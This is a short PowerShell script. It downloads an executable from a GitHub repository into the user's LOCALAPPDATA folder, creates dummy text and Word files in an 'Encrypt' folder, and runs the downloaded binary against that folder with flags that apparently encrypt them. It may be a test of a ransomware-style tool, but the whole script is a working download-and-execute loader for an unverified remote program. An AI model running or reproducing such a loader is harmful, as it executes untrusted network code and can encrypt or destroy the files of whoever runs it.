$localpath = "${env:LOCALAPPDATA}"
$localpath = $localpath -replace ' ', '` '
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://github.com/ashakiro/test1/raw/main/main.exe","$localpath\main1.exe")


New-Item -Path "$localpath\Encrypt\PStxt.txt"
New-Item -Path "$localpath\Encrypt\PSdoc.doc"
$localpathexe = $localpath + "\main1.exe"
$localpathenc = $localpath + "\Encrypt"
powershell $localpathexe -p $localpathenc -e
